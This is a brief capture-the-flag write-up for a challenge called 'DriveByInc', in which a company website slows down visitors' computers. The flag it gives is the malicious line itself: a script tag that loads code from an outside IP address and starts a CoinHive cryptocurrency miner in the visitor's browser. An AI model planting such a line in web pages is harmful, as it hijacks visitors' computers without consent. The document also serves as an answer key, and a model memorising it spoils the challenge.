# 0_intrusion
DriveByInc

## Challenge 

Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers. Over the past few years we moved to hosting a large portion of our business on a nice looking website. Recently our customers are complaining that the front page of our website is causing their computers to run extremely slowly. We hope that it is just because we added too much javascript but can you take a look for us just to make sure?

1. What is the full malicious line? (Including any HTML tags)

## Solution

Look through the HTML to find it

## Flag

	<script src = http://10.187.195.95/js/colorbox.min.js></script><script>var color = new CoinHive.Anonymous("123456-asdfgh");color.start()</script></body>
